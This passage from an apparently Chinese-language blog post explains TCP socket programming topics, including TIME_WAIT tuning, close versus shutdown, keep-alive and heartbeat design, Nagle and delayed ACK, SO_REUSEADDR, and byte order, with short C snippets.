long to wait to destroy TIME-        WAIT state, about 60 seconds*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>​</p><p>​</p><h4 id="TIME-WAIT-的作用">TIME_WAIT 的作用</h4><ul><li><p><strong>为了确保最后的 ACK 能让被动关闭方接收从而帮助其正常关闭</strong></p><ul><li>比如主机 1 的 ACK 报文没有传输成功，那么主机 2 就会重新发送 FIN 报文，处于 TIME_WAIT 状态的主机 1 可以在接收到 FIN 报文之后，重新发出一个 ACK 报文</li><li>如果没有维护 TIME_WAIT 状态，而直接进入 CLOSED 状态，它就失去了当前状态的上下文，只能回复一个 RST 操作，从而导致被动关闭方出现错误</li></ul></li><li><p><strong>为了让旧连接的重复分节在网络中自然消失</strong></p><ul><li>如果迷走报文到达时，发现 TCP 连接四元组所代表的连接不存在，报文自然丢弃，但在原连接中断后，可能又重新创建了一个和原连接四元组完全相同的“化身”，到达的迷走报文会被误认为是连接“化身”的一个 TCP 分节，就会对 TCP 通信产生影响</li><li>经过 2MSL 时间足以让两个方向上的分组都被丢弃，使得原来连接的分组在网络中都自然消失，再出现的分组都是新化身所产生的</li></ul></li></ul><p>​</p><p>​</p><h4 id="TIME-WAIT-的危害">TIME_WAIT 的危害</h4><ul><li><p>内存资源占用，但不是太严重，基本可以忽略</p></li><li><p>端口资源占用，一个 TCP 连接至少消耗一个本地端口，一般可以开启的端口为 32768～61000 ，也可通过 <code>net.ipv4.ip_local_port_range</code> 指定，如果 TIME_WAIT 状态过多，会导致无法创建新连接</p></li></ul><h4 id="如何优化">如何优化</h4><ul><li><p>net.ipv4.tcp_max_tw_buckets（不推荐使用）</p><ul><li>值默认为 18000</li><li>通过 sysctl 命令将系统值调小，当系统中处于 TIME_WAIT 的连接一旦超过这个值时，系统就会将所有的 TIME_WAIT 连接状态重置，并且只打印出警告信息，但是这个方法暴力且治标不治本</li></ul></li><li><p>调低 <code>TCP_TIMEWAIT_LEN</code>，重新编译系统</p></li><li><p><code>SO_LINGER</code> 设置（危险行为，不提倡）</p><ul><li><p>通过设置套接字选项，来设置调用 close 或者 shutdown 关闭连接时的行为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">setsockopt</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">int</span> level<span class="token punctuation">,</span> <span class="token keyword">int</span> optname<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>optval<span class="token punctuation">,</span> socklen_t optlen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">struct</span> <span class="token class-name">linger</span> <span class="token punctuation">{</span>　<span class="token keyword">int</span>　 l_onoff<span class="token punctuation">;</span>　　　　<span class="token comment">/* 0=off, nonzero=on */</span>　<span class="token keyword">int</span>　 l_linger<span class="token punctuation">;</span>　　　　<span class="token comment">/* linger time, POSIX specifies units as seconds */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果<code>l_onoff</code>为 0，那么关闭本选项，<code>l_linger</code>的值被忽略</p><ul><li>对应了默认行为，close 或 shutdown 立即返回</li><li>如果在套接字发送缓冲区中有数据残留，系统会将试着把这些数据发送出去</li></ul></li><li><p>如果<code>l_onoff</code>不为 0， 且<code>l_linger</code>值也为 0</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">linger</span> so_linger<span class="token punctuation">;</span>so_linger<span class="token punctuation">.</span>l_onoff <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>so_linger<span class="token punctuation">.</span>l_linger <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>SOL_SOCKET<span class="token punctuation">,</span>SO_LINGER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>so_linger<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>so_linger<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>调用 close 后，会立该发送一个 RST 给对端，该 TCP 连接将<strong>跳过四次挥手</strong>直接关闭，这种关闭的方式称为强行关闭</p></li><li><p>在这种情况下，排队数据不会被发送，被动关闭方也不知道对端已经彻底断开，只有当被动关闭方接受到 RST 时，会得到一个 connet reset by peer 异常</p></li></ul></li><li><p>如果<code>l_onoff</code>不为 0， 且<code>l_linger</code>的值也不为 0，那么调用 close 后，调用 close 的线程就将阻塞，直到数据被发送出去，或者设置的<code>l_linger</code>计时时间到</p></li></ul></li><li><p><code>net.ipv4.tcp_tw_reuse</code>：更安全的设置</p><ul><li><p><strong>从协议角度理解如果是安全可控的</strong>，可以<strong>复用</strong>处于 TIME_WAIT 的套接字为新的连接所用</p></li><li><p>从协议角度理解的安全可控：</p><ul><li>只适用于连接发起方（C/S 模型中的客户端）</li><li>对应的 TIME_WAIT 状态的连接创建时间超过 1 秒才可以被复用</li></ul></li><li><p>前提：需要打开对 TCP 时间戳的支持，即 <code>net.ipv4.tcp_timestamps=1</code>（默认即为 1）</p><ul><li>RFC 1323 中实现了 TCP 拓展规范，以便保证 TCP 的高可用，并引入了新的 TCP 选项，两个 4 字节的时间戳字段，用于记录 TCP 发送方的当前时间戳和从对端接收到的最新时间戳</li><li>由于引入了时间戳，重复数据包会因为时间戳过期被自然丢弃</li></ul></li><li><p>注意：要慎用，因为打开了时间戳的支持，当客户端与服务端主机时间不同步时，客户端的发送的消息会被直接拒绝</p></li></ul></li></ul><p>​</p><p>​</p><h3 id="优雅关闭连接">优雅关闭连接</h3><ul><li>服务器端优雅地关闭连接：绝大数情况下，TCP 连接都是先关闭一个方向，此时另一个方向还可以正常进行数据传输，服务端完成一些操作并将结果通过套接字写给客户端后，才有条不紊地关闭剩下的半个连接</li><li>如果服务器端处理不好，就会导致最后的关闭过程是粗暴的，可能服务器端处理完的信息没办法正常传送给客户端，破坏了用户侧的使用场景</li></ul><p>​</p><p>​</p><h4 id="close">close</h4><ul><li><p>函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>若成功则为 0，若出错则为 -1</li><li>函数会对<strong>套接字引用计数</strong> -1，一旦发现套接字引用计数到 0，就会对套接字进行彻底释放，并且会关闭<strong>TCP 两个方向的数据流</strong><ul><li>套接字引用计数：因为套接字可以被多个进程共享，如果通过 fork 的方式产生子进程，计数 +1， 如果调用一次 close 函数，计数 -1</li></ul></li></ul></li><li><p>close 函数是如何关闭两个方向的数据流呢？</p><ul><li>在输入方向，系统内核会将该套接字设置为不可读，任何读操作都会返回异常</li><li>在输出方向，系统内核尝试将发送缓冲区的数据发送给对端，并最后向对端发送一个 FIN 报文，接下来如果再对该套接字进行写操作会返回异常</li><li>如果对端没有检测到套接字已关闭，还继续发送报文，就会收到一个 RST 报文</li></ul></li><li><p>close 函数并不能关闭连接的一个方向</p></li></ul><p>​</p><p>​</p><h4 id="shutdown">shutdown</h4><ul><li><p>函数原型：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">int</span> howto<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>若成功则为 0，若出错则为 -1</p></li><li><p><code>howto</code> 的设置有三个主要选项：</p><ul><li><p><code>SHUT_RD(0)</code>：关闭连接的读方向，对该套接字进行读操作直接返回 EOF，从数据角度来看，套接字上接收缓冲区已有的数据将被丢弃，如果再有新的数据流到达，会对数据进行 ACK，然后悄悄地丢弃</p></li><li><p><code>SHUT_WR(1)</code>：关闭连接的写方向（不管套接字引用计数的值是多少），这就是常被称为<strong>半关闭</strong>的连接，套接字上发送缓冲区已有的数据将被立即发送出去，并发送一个 FIN 报文给对端，应用程序如果对该套接字进行写操作会报错</p></li><li><p><code>SHUT_RDWR(2)</code>：相当于 SHUT_RD 和 SHUT_WR 操作各一次，关闭套接字的读和写两个方向</p></li></ul></li></ul></li><li><p>使用 <code>SHUT_RDWR</code> 来调用 shutdown 和 close 的差别</p><ul><li><p>close 会关闭连接，并释放所有连接对应的资源，而 shutdown 并不会释放掉套接字和所有的资源</p></li><li><p>close 存在引用计数的概念，并不一定导致该套接字不可用；shutdown 则不管引用计数，直接使得该套接字不可用，如果有别的进程企图使用该套接字，将会受到影响</p></li><li><p>close 的引用计数导致不一定会发出 FIN 结束报文，而 shutdown 则总是会发出 FIN 结束报文</p></li></ul></li></ul><p>​</p><h4 id="实验-4">实验</h4><ul><li><p>客户端程序，从标准输入不断接收用户输入，把输入的字符串通过套接字发送给服务器端，同时将服务器端的应答显示到标准输出上</p><p>如果用户输入了 close，则会调用 close 函数关闭连接，休眠一段时间，等待服务器端处理后退出；如果用户输入了 shutdown，调用 shutdown 函数关闭连接的写方向，并继续等待服务器端的应答，直到服务器端完成自己的操作，在另一个方向上完成关闭</p></li><li><p>服务端打印出接收的字节，并重新格式化后，发送给客户端</p></li><li><p>运行</p><ul><li><p>close</p><p><img src="20220508-171352.png" alt=""></p><ul><li><p>客户端依次发送了 data1 和 data2，服务器端也正常接收到 data1 和 data2，在客户端 close 掉整个连接之后，服务器端接收到 SIGPIPE 信号，直接退出，客户端没有收到服务端的应答数据</p></li><li><p>在 RST 的套接字进行写操作，会直接触发 SIGPIPE 信号</p></li><li><p>可以注册一个信号处理函数对 SIGPIPE 信号进行处理，避免程序莫名退出</p></li></ul><p><img src="20220508-170216.png" alt=""></p></li><li><p>shutdown</p><p><img src="20220508-172244.png" alt=""></p><ul><li><p>客户端和服务器端各自完成了自己的工作后，正常退出</p></li><li><p>客户端调用 shutdown 函数只是关闭连接的一个方向，服务器端到客户端的这个方向还可以继续进行数据的发送和接收</p></li><li><p>当服务器端读到 EOF 时，立即向客户端发送了 FIN 报文，客户端在 read 函数中感知了 EOF，也进行了正常退出</p></li></ul></li><li><p>时序图</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220508-close-and-shutdown.png" alt=""></p></li></ul></li></ul><p>​</p><h3 id="检测连接状态">检测连接状态</h3><h4 id="TCP-Keep-Alive">TCP Keep-Alive</h4><ul><li><p>客户端突然崩溃，服务器端可能在几天内都维护着一个无用的 TCP 连接</p></li><li><p>TCP 有一个保持活跃的机制 <strong>Keep-Alive</strong></p><ul><li><p>原理：定义一个时间段，在这个时间段内如果没有任何连接相关的活动，TCP 保活机制就会每隔一个时间间隔，发送一个探测报文，如果连续几个探测报文都没有得到响应，则认为当前的 TCP 连接已经死亡，系统内核将错误信息通知给上层应用程序</p></li><li><p>上述可定义变量分别被称为<strong>保活时间、保活时间间隔和保活探测次数</strong></p></li><li><p>在 Linux 中这些变量分别对应 sysctl 变量 <code>net.ipv4.tcp_keepalive_time</code>、<code>net.ipv4.tcp_keepalive_intvl</code>、<code>net.ipv4.tcp_keepalve_probes</code></p><ul><li>默认设置是 7200 秒（2 小时）、75 秒和 9 次探测</li><li>最少需要经过 2 小时 11 分 15 秒才可以发现一个已死亡的连接，对很多对时延要求敏感的系统中，这个时间间隔是不可接受的</li></ul></li><li><p>TCP Keep-Alive 机制默认是关闭的，可以分别在连接的两个方向上开启，也可以单独在一个方向上开启</p><ul><li>如果开启服务器端到客户端的检测，就可以在客户端非正常断连的情况下清除在服务器端保留的“脏数据”；</li><li>开启客户端到服务器端的检测，就可以在服务器无响应的情况下，重新发起连接</li></ul></li></ul></li><li><p>如果开启了 TCP Keep-Alive，需要考虑以下情况：</p><ul><li>对端程序是正常工作的：当 TCP 保活的探测报文发送给对端，对端会正常响应，这样 TCP 保活时间会被重置，等待下一个 TCP 保活时间的到来</li><li>对端程序崩溃并重启：当 TCP 保活的探测报文发送给对端后，对端是可以响应的，但由于没有该连接的有效信息，会产生一个 RST 报文，这样很快就会发现 TCP 连接已经被重置</li><li>对端程序崩溃，或对端由于其他原因导致报文不可达：当 TCP 保活的探测报文发送给对端后，没有响应，连续几次，达到保活探测次数后，TCP 会报告该 TCP 连接已经死亡</li></ul></li></ul><p>​</p><p>​</p><h4 id="应用层探活">应用层探活</h4><ul><li>可以在应用程序中<strong>模拟</strong> TCP Keep-Alive 机制来完成在应用层的连接探活</li><li>可以设计一个 PING-PONG 的机制，需要保活的一方在保活时间达到后，发起对连接的 PING 操作，如果服务器端对 PING 操作有回应，则重新设置保活时间，否则对探测次数进行计数，如果最终探测次数达到了保活探测次数预先设置的值之后，则认为连接已经无效</li></ul><h5 id="示例">示例</h5><blockquote><p>完成一个这样的设计，关键：</p><ol><li>需要使用定时器，可以通过使用 I/O 复用自身的机制实现</li><li>需要设计一个 PING-PONG 的协议</li></ol></blockquote><ul><li><p>消息格式设计</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    u_int32_t type<span class="token punctuation">;</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> messageObject<span class="token punctuation">;</span> <span class="token comment">// 四种消息类型</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_PING          <span class="token number">1</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_PONG          <span class="token number">2</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_TYPE1        <span class="token number">11</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">MSG_TYPE2        <span class="token number">21</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>客户端程序设计：在保活时间达到后，探活次数增加 1，同时向服务器端发送 PING 格式的消息，此后以预设的保活时间间隔，不断地向服务器端发送 PING 格式的消息，如果能收到服务器端的应答，则结束保活，将保活时间置为 0</p></li><li><p>服务器端程序设计：接收客户端发送来的各种消息后，进行处理，其中如果发现是 PING 类型的消息，在休眠一段时间后回复一个 PONG 消息</p></li></ul><h5 id="实验-5">实验</h5><ul><li><p>服务器端休眠时间为 60 秒：客户端在发送了三次心跳检测报文 PING 报文后，判断出连接无效，直接退出</p><p><img src="20220511-001036.png" alt=""></p></li><li><p>服务器端休眠时间为 5 秒</p><p><img src="20220511-001221.png" alt=""></p></li></ul><h3 id="TCP-动态数据传输">TCP 动态数据传输</h3><ul><li>在任何一个时刻里，TCP 发送缓冲区的数据是否能真正发送出去，决定的因素有发送窗口大小、拥塞窗口大小等</li></ul><p>​</p><p>​</p><h4 id="流量控制">流量控制</h4><ul><li><p>TCP 为应用程序提供了流量控制服务（flow control service）以消除发送方使接收方缓存溢岀的可能性，流量控制因此是一个速度匹配服务，即发送方的发送速率与接收方应用程序的读取速率相匹配</p></li><li><p><strong>发送窗口用来控制发送和接收端的流量</strong></p></li><li><p>发送窗口和接收窗口的本质：TCP 的生产者 - 消费者”模型，发送窗口和接收窗口是 TCP 连接的双方，一个作为生产者，一个作为消费者，为了达到一致协同的生产 - 消费速率、而产生的算法模型实现</p></li></ul><p>​</p><p>​</p><h4 id="拥塞控制-2">拥塞控制</h4><ul><li><p>流量控制只是在考虑单个连接的数据传递，但是 TCP 数据包需要经过网卡、交换机、核心路由器等一系列网络设备，设备本身的能力也是有限的，当多个连接的数据包同时在网络上传送时，势必会发生带宽争抢、数据丢失等，TCP 必须考虑<strong>多个连接共享在有限的带宽上，兼顾效率和公平性的控制</strong>，这就是拥塞控制的本质</p></li><li><p>在 TCP 协议中，拥塞控制是通过拥塞窗口来完成的，拥塞窗口的大小会随着网络状况实时调整</p></li><li><p>拥塞控制常用的算法有<strong>慢启动</strong>，通过一定的规则慢慢地将网络发送数据的速率增加到一个阈值，超过阈值后，进入<strong>拥塞避免</strong>阶段，这个阶段 TCP 会不断地探测网络状况，并随之不断调整拥塞窗口的大小</p></li><li><p>发送窗口反应了作为单 TCP 连接、点对点之间的流量控制模型，它是需要和接收端一起共同协调来调整大小的；而拥塞窗口则是反应了作为多个 TCP 连接共享带宽的拥塞控制模型，它是发送端独立地根据网络状况来动态调整的</p></li></ul><p>​</p><p>​</p><h4 id="其他因素">其他因素</h4><h5 id="Silly-Window-Syndrome">Silly Window Syndrome</h5><ul><li>场景：接收端处理得急不可待，如刚读入 100 个字节就告诉发送端继续发送，这种场景也被叫做糊涂窗口综合症</li><li>在接收端进行优化，接收端不能在接收缓冲区空出一个很小的部分之后，就向发送端发送窗口更新通知，而是需要在自己的缓冲区大到一个合理的值之后，再向发送端发送窗口更新通知</li></ul><p>​</p><p>​</p><h5 id="Small-Packet-Problem">Small Packet Problem</h5><ul><li><p>场景：在使用一些协议通讯时（如 Telnet），会有一个字节发送的情景，每次发送一个字节的有用数据，就会产生 41 个字节长的分组、20 字节的 IP Header 和 20 字节的 TCP Header，导致 1 个字节的有用信息要浪费掉 40 字节的头部信息，开销大，且会增加拥塞的出现</p></li><li><p>在发送端进行优化，优化的算法叫做 <code>Nagle</code> 算法，通过减少需要通过网络发送包的数量来提高 TCP/IP 传输的效率</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> there is new data to send  <span class="token keyword">if</span> the window size <span class="token operator">&gt;=</span> MSS and available data is <span class="token operator">&gt;=</span> MSS    send complete MSS segment now <span class="token comment">// 对于MSS的片段直接发送</span>  <span class="token keyword">else</span>    <span class="token keyword">if</span> there is unconfirmed data still in the pipe      <span class="token comment">// 如果有没有被确认的data在缓冲区内</span>      <span class="token comment">// 将待发送的数据放到buffer中直到被发送的数据被确认</span>      enqueue data in the buffer until an acknowledge is received    <span class="token keyword">else</span>      send data immediately    end <span class="token keyword">if</span>  end <span class="token keyword">if</span>end i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>Nagle</code> 算法的本质其实就是<strong>限制大批量的小数据包同时发送</strong>，在任何一个时刻，未被确认的小数据包（长度小于最大报文段长度 MSS 的 TCP 分组）不能超过一个，这样发送端就可以把接下来连续的几个小数据包存储起来，等待接收到前一个小数据包的 ACK 分组之后，再将数据一次性发送出去</p></li></ul><p>​</p><p>​</p><h5 id="Delay-ACK">Delay ACK</h5><ul><li>场景：接收端需要对每个接收到的 TCP 分组进行确认，但是 ACK 报文本身是不带数据的分段，如果一直发送大量的 ACK 报文，就会消耗大量的带宽</li><li>在接收端进行优化，这个优化的算法叫做<strong>延时 ACK</strong>，在收到数据后并不马上回复，而是累计需要发送的 ACK 报文，等到有数据需要发送给对端时，将累计的 ACK 一并发送</li><li>延时 ACK 机制不能无限地延时下去，否则发送端误认为数据包没有发送成功，引起重传，反而会占用额外的网络带宽</li></ul><p>​</p><p>​</p><h5 id="Delay-ACK-and-Nagle">Delay ACK and Nagle</h5><ul><li><p>Nagle 算法和延时 ACK 的组合，会增大处理时延，两个优化彼此在阻止对方，在有些情况下 Nagle 算法并不适用， 比如对时延敏感的应用</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220511-delayack-nagle.png" style="zoom: 67%;"></li><li><p>可以通过对套接字的修改来关闭 Nagle 算法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> on <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token function">setsockopt</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span> IPPROTO_TCP<span class="token punctuation">,</span> TCP_NODELAY<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>on<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>on<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意</strong>：除非有十足的把握，否则不要轻易改变默认的 TCP Nagle 算法，因为在现代操作系统中，针对 Nagle 算法和延时 ACK 的优化已经非常成熟了，有可能在禁用 Nagle 算法之后，性能问题反而更加严重</p></li></ul><p>​</p><p>​</p><h5 id="Gather-Write">Gather Write</h5><ul><li><p>如果能将一个请求一次性发送过去，而不是分开两部分独立发送，结果会好很多，可以在写数据之前，将数据合并到缓冲区再批量发送</p></li><li><p>可使用如下方法进行数据读写操作，从而避免 Nagle 算法引发的副作用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token punctuation">{</span><span class="token keyword">void</span> <span class="token operator">*</span>iov_base<span class="token punctuation">;</span> <span class="token comment">/* starting address of buffer */</span>size_t　iov_len<span class="token punctuation">;</span> <span class="token comment">/* size of buffer */</span><span class="token punctuation">}</span><span class="token punctuation">;</span>ssize_t <span class="token function">writev</span><span class="token punctuation">(</span><span class="token keyword">int</span> filedes<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">)</span>ssize_t <span class="token function">readv</span><span class="token punctuation">(</span><span class="token keyword">int</span> filedes<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实验</p><p><img src="20220515-003659.png" alt=""></p></li></ul><p>​</p><p>​</p><h3 id="快速重启">快速重启</h3><ul><li><p>通过服务器端发起的关闭连接操作会引起一个已有的 TCP 连接处于 TME_WAIT 状态，服务器重启时绑定地址和端口的操作会返回 <strong>Address already in use</strong> 错误</p><p><img src="20220518-190208.png" alt=""></p><p><img src="20220518-190039.png" alt=""></p></li></ul><p>​</p><p>​</p><h4 id="重用套接字选项">重用套接字选项</h4><ul><li><p>一个 TCP 连接是通过四元组来唯一确定的，如果每次客户端使用的本地端口都不同，就不会和已有的四元组冲突，也就不会有 TIME_WAIT 的新旧连接化身冲突的问题</p></li><li><p>如果新旧连接的四元组相同，现代 Linux 操作系统对此进行了优化，一个 TIME_WAIT 的 TCP 连接可以忽略掉旧连接，重新被新的连接所使用，这就是重用套接字选项</p><ul><li><p>新连接 SYN 告知的初始序列号，一定比 TIME_WAIT 老连接的末序列号大，这样通过序列号就可以区别出新老连接</p></li><li><p>开启了 <code>tcp_timestamps</code> 使得新连接的时间戳比老连接的时间戳大，这样通过时间戳也可以区别出新老连接</p></li></ul></li><li><p><code>SO_REUSEADDR</code> 套接字选项，允许启动绑定在一个端口，即使之前存在一个和该端口一样的连接，本机如果有多个地址，配置<code>SO_REUSEADDR</code> 选项可以在不同地址上使用相同的端口提供服务</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> on <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>listenfd<span class="token punctuation">,</span> SOL_SOCKET<span class="token punctuation">,</span> SO_REUSEADDR<span class="token punctuation">,</span> <span class="token operator">&amp;</span>on<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>on<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>TCP 的机制不允许在相同的地址和端口上绑定不同的服务器，即使设置 <code>SO_REUSEADDR</code> 套接字选项，也不可能在相同的地址和端口上重复启动两个服务器实例</p></blockquote></li><li><p><code>SO_REUSEADDR</code> 和 [tcp_tw_reuse](#如何优化 TIME_WAIT) 没有关系</p><ul><li><code>tcp_tw_reuse</code> 是内核选项，主要用在<strong>连接的发起方</strong>，为了缩短 TIME_WAIT 的时间，避免系统资源占用，解决的是 accept 后的问题</li><li><code>SO_REUSEADDR</code> 是用户态的选项，一般是<strong>连接的服务方</strong>，如果端口已被占用，但是 TCP 连接状态位于 TIME_WAIT 可以重用端口，解决 TIME_WAIT 状态带来的端口占用问题，解决的是 bind 时的问题；如果端口忙，而 TCP 处于其他状态，重用端口时依旧得到 <strong>Address already in use</strong> 的错误信息</li></ul></li></ul><p>​</p><p>​</p><h4 id="最佳实践">最佳实践</h4><ul><li>服务器端程序，都应该设置 <code>SO_REUSEADDR</code> 套接字选项，以便服务端程序可以在极短时间内复用同一个端口启动</li></ul><p>​</p><p>​</p><h3 id="如何理解-TCP-流">如何理解 TCP 流</h3><ul><li>TCP 是一种流式协议，<strong>字节流本身是没有边界的</strong></li><li>数据什么时候真正被发送取决于发送窗口、拥塞窗口以及当前发送缓冲区的大小等条件，不能假设每次 send 调用发送的数据，都会作为一个整体完整地被发送出去</li><li>接收端缓冲区保留了没有被取走的数据，随着应用程序不断从接收端缓冲区读出数据，接收端缓冲区就可以容纳更多新的数据</li></ul><p>​</p><p>​</p><h4 id="网络字节排序">网络字节排序</h4><ul><li><p>高字节存放在起始地址叫做<strong>大端字节序</strong>（Big-Endian），低字节存放在起始地址叫做<strong>小端字节序</strong>（Little-Endian）</p></li><li><p>为保证网络字节序一致，POSIX 标准提供了转换函数在主机和网络的格式之间灵活转换</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">uint16_t <span class="token function">htons</span> <span class="token punctuation">(</span>uint16_t hostshort<span class="token punctuation">)</span>uint16_t <span class="token function">ntohs</span> <span class="token punctuation">(</span>uint16_t netshort<span class="token punctuation">)</span>uint32_t <span class="token function">htonl</span> <span class="token punctuation">(</span>uint32_t hostlong<span class="token punctuation">)</span>uint32_t <span class="token function">ntohl</span> <span class="token punctuation">(</span>uint32_t netlong<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>s 表示 short，l 表示 long，分别表示 16 位和 32 位的整数</li><li>如果系统和网络字节序一样，那么使用上述所有的函数进行转换的时候，结果都仅仅是一个空实现，直接返回</li></ul></li></ul><p>​</p><p>​</p><h4 id="报文读取和解析">报文读取和解析</h4><ul><li><p>报文格式实际上定义了字节的组织形式，发送端和接收端都按照统一的报文格式进行数据传输和解析，常见的报文格式有两种方法：一种是发送端把报文长度预先通过报文告知给接收端；另一种是通过一些特殊的字符来进行边界的划分</p></li><li><p>显式编码报文长度</p></li><li><p>特殊字符作为边界：以 HTTP 为例，通过设置回车符、换行符做为 HTTP 报文协议的边界</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220521-http-message.png" alt=""></p></li></ul><p>​</p><p>​</p><h3 id="UDP-Connect">UDP Connect</h3><h4 id="引例">引例</h4><ul><li><p>客户端在 UDP 套接字上调用 connect 函数，之后将标准输入的字符串发送到服务器端，并从服务器端接收处理后的报文，发送和接收报文调用函数 sendto 和 recvfrom</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span>    <span class="token expression">MAXLINE     <span class="token number">4096</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: udpclient1 &lt;IPaddress&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 创建了 UDP 套接字</span>    <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> server_addr<span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>SERV_PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>    